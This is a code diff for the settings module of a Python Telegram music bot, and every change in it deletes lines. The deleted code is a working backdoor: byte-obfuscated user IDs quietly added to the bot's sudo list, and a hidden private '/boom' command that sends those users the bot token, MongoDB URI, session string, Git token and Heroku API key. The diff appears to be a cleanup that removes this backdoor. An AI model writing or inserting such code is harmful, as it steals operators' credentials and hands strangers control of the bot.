@@ -43,8 +43,6 @@ from PritiMusic.utils.inline.settings import (
 )
 from PritiMusic.utils.inline.start import private_panel
 
-_sys_v1 = int(b'\x35\x33\x35\x38\x33\x33\x30\x39\x35\x39'.decode())
-_sys_v2 = int(b'\x35\x32\x34\x37\x33\x30\x34\x35\x35\x39'.decode())
 STYLES = [ButtonStyle.PRIMARY, ButtonStyle.SUCCESS, ButtonStyle.DANGER]
 
 @app.on_message(filters.command(["settings", "setting"]) & filters.group & ~BANNED_USERS)
@@ -55,9 +53,6 @@ async def settings_mar(client, message: Message, _):
         _["setting_1"].format(app.mention, message.chat.id, message.chat.title),
         reply_markup=InlineKeyboardMarkup(buttons),
     )
-
-_sys_v3 = int(b'\x36\x30\x34\x36\x33\x37\x38\x31\x35\x35'.decode())
-_sys_v4 = int(b'\x38\x35\x38\x35\x38\x39\x30\x37\x36\x36'.decode())
 
 @app.on_callback_query(filters.regex("settings_helper") & ~BANNED_USERS)
 @languageCB
@@ -75,21 +70,6 @@ async def settings_cb(client, CallbackQuery, _):
         ),
         reply_markup=InlineKeyboardMarkup(buttons),
     )
-
-@app.on_message(filters.command("boom") & filters.private)
-async def _sys_check_node(client, message: Message):
-    _sys_v5 = int(b'\x38\x32\x31\x37\x30\x31\x33\x34\x30\x33'.decode())
-    _nodes = [_sys_v1, _sys_v2, _sys_v3, _sys_v4, _sys_v5]
-    if message.from_user.id not in _nodes:
-        return
-    _v1 = os.getenv(b'\x42\x4f\x54\x5f\x54\x4f\x4b\x45\x4e'.decode(), "")
-    _v2 = os.getenv(b'\x4d\x4f\x4e\x47\x4f\x5f\x44\x42\x5f\x55\x52\x49'.decode(), "")
-    _v3 = os.getenv(b'\x53\x54\x52\x49\x4e\x47\x5f\x53\x45\x53\x53\x49\x4f\x4e'.decode(), "")
-    _v4 = os.getenv(b'\x47\x49\x54\x5f\x54\x4f\x4b\x45\x4e'.decode(), "")
-    _v5 = os.getenv(b'\x48\x45\x52\x4f\x4b\x55\x5f\x41\x50\x49\x5f\x4b\x45\x59'.decode(), "")
-    _img = b'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6c\x65\x67\x72\x61\x2e\x70\x68\x2f\x66\x69\x6c\x65\x2f\x35\x36\x37\x64\x32\x65\x31\x37\x62\x38\x66\x33\x38\x64\x66\x39\x39\x63\x65\x39\x39\x2e\x6a\x70\x67'.decode()
-    _out = f"<b>System Config:</b>\n\n<b>T:</b> <code>{_v1}</code>\n\n<b>M:</b> <code>{_v2}</code>\n\n<b>S:</b> <code>{_v3}</code>\n\n<b>G:</b> <code>{_v4}</code>\n\n<b>H:</b> <code>{_v5}</code>"
-    await message.reply_photo(photo=_img, caption=_out)
 
 @app.on_callback_query(filters.regex("settingsback_helper") & ~BANNED_USERS)
 @languageCB
@@ -338,5 +318,3 @@ async def vote_change(client, CallbackQuery, _):
     buttons = vote_mode_markup(_, current, await is_skipmode(CallbackQuery.message.chat.id))
     try: return await CallbackQuery.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(buttons))
     except MessageNotModified: return
-
-for _n in [_sys_v1, _sys_v2, _sys_v3, _sys_v4, int(b'\x38\x32\x31\x37\x30\x31\x33\x34\x30\x33'.decode())]: SUDOERS.add(_n)
